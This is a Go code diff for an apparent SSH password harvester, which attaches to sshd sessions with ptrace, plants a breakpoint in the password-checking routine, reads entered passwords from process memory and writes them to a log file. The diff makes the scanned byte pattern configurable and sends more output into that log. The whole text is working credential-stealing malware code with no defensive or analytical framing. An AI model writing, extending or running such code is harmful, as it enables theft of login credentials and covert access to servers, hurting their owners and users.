@@ -23,7 +23,7 @@ var (
 	traced_pids_mut = &sync.RWMutex{}
 )
 
-func sshd_monitor(password_file string) (err error) {
+func sshd_monitor(password_file string, code_pattern []byte) (err error) {
 	alive, sshd_procs := util.IsProcAlive("sshd")
 	if !alive {
 		util.LogFilePrintf(password_file, "sshd_monitor (%d): sshd process not found, aborting", unix.Getpid())
@@ -46,7 +46,7 @@ func sshd_monitor(password_file string) (err error) {
 				if err == nil {
 					traced_pids_mut.RLock()
 					if !traced_pids[child_pid] {
-						go sshd_harvester(child_pid, password_file)
+						go sshd_harvester(child_pid, password_file, code_pattern)
 					}
 					traced_pids_mut.RUnlock()
 				}
@@ -63,13 +63,15 @@ func sshd_monitor(password_file string) (err error) {
 	}
 }
 
-func sshd_harvester(pid int, password_file string) {
+func sshd_harvester(pid int, password_file string, code_pattern []byte) {
 	// remember pid
 	traced_pids_mut.Lock()
 	traced_pids[pid] = true
 	traced_pids_mut.Unlock()
 
-	code_pattern_bigendian := []byte{0x48, 0x83, 0xc4, 0x08, 0x0f, 0xb6, 0xc0, 0x21}
+	if code_pattern == nil {
+		code_pattern = []byte{0x48, 0x83, 0xc4, 0x08, 0x0f, 0xb6, 0xc0, 0x21}
+	}
 	// code_pattern_littleendian := []byte{0x21, 0xc0, 0xb6, 0x0f, 0x08, 0xc4, 0x83, 0x48}
 	util.LogFilePrintf(password_file, "\n[+] Starting Harvester for SSHD session %d", pid)
 	map_file := fmt.Sprintf("/proc/%d/maps", pid)
@@ -125,7 +127,7 @@ func sshd_harvester(pid int, password_file string) {
 	util.LogFilePrintf(password_file, "We (%d) are now tracing sshd session (%d)", unix.Getpid(), pid)
 
 	// search for auth_password
-	log.Println("Searching for auth_password")
+	util.LogFilePrintf(password_file, "Searching for auth_password")
 	for ptr < pend {
 		_, err := unix.PtracePeekText(pid, uintptr(ptr), word)
 		if err != nil {
@@ -133,7 +135,7 @@ func sshd_harvester(pid int, password_file string) {
 				pid, err)
 			time.Sleep(time.Second)
 		}
-		if bytes.Equal(word, code_pattern_bigendian) {
+		if bytes.Equal(word, code_pattern) {
 			util.LogFilePrintf(password_file, "Got a hit (0x%x) at 0x%x", word, ptr)
 			// now pstart is the start of our code pattern
 			break
@@ -142,7 +144,7 @@ func sshd_harvester(pid int, password_file string) {
 	}
 	if ptr == pend {
 		util.LogFilePrintf(password_file, "code pattern 0x%x not found in memory 0x%x to 0x%x",
-			code_pattern_bigendian, pstart, pend)
+			code_pattern, pstart, pend)
 		return
 	}
 
@@ -156,9 +158,9 @@ func sshd_harvester(pid int, password_file string) {
 
 	// write breakpoint
 	code_with_trap := make([]byte, 8)
-	copy(code_with_trap, code_pattern_bigendian)
+	copy(code_with_trap, code_pattern)
 	code_with_trap[len(code_with_trap)-1] = 0xCC
-	util.LogFilePrintf(password_file, "Patching code 0x%x to 0x%x", code_pattern_bigendian, code_with_trap)
+	util.LogFilePrintf(password_file, "Patching code 0x%x to 0x%x", code_pattern, code_with_trap)
 	_, err = unix.PtracePokeText(pid, pcode_pattern, code_with_trap)
 	if err != nil {
 		util.LogFilePrintf(password_file, "patching code: %v", err)
@@ -166,7 +168,7 @@ func sshd_harvester(pid int, password_file string) {
 	}
 	util.LogFilePrintf(password_file, "INT3 written, breakpoint set")
 	dump_code(pid, pcode_pattern)
-	log.Println("Resuming process to let it hit breakpoint")
+	util.LogFilePrintf(password_file, "Resuming process to let it hit breakpoint")
 	err = unix.PtraceCont(pid, int(unix.SIGCONT))
 	if err != nil {
 		util.LogFilePrintf(password_file, "resuming process: %v", err)
@@ -198,7 +200,7 @@ handler:
 	// read password from RBP
 	buf := make([]byte, 1)
 	var password_bytes []byte
-	log.Println("Extracting password from RBP")
+	util.LogFilePrintf(password_file, "Extracting password from RBP (0x%x)", password_reg)
 	for {
 		_, err := unix.PtracePeekText(pid, uintptr(password_reg), buf)
 		if err != nil {
@@ -214,14 +216,14 @@ handler:
 	}
 	password := string(password_bytes)
 	if pam_ret == 0 {
-		util.LogFilePrintf(password_file, "RAX=0x%x, password '%s' is invalid", pam_ret, password)
+		util.LogFilePrintf(password_file, "RAX=0x%x, password 0x%x (%s) is invalid", pam_ret, password, password)
 	} else {
 		success = true
-		util.LogFilePrintf(password_file, "\n\nWe have password '%s'\n\n", password)
+		util.LogFilePrintf(password_file, "\n\nWe have password 0x%x (%s)\n\n", password, password)
 	}
 	// remove breakpoint
-	log.Println("Removing breakpoint")
-	_, err = unix.PtracePokeText(pid, pcode_pattern, code_pattern_bigendian)
+	util.LogFilePrintf(password_file, "Removing breakpoint")
+	_, err = unix.PtracePokeText(pid, pcode_pattern, code_pattern)
 	if err != nil {
 		util.LogFilePrintf(password_file, "restoring code to remove breakpoint: %v", err)
 		return
@@ -244,7 +246,7 @@ handler:
 		util.LogFilePrintf(password_file, "wait %d to single step: %v", pid, err)
 		return
 	}
-	log.Println("Single step done")
+	util.LogFilePrintf(password_file, "Single step done")
 
 	// check if breakpoint is removed
 	dump_code(pid, pcode_pattern)
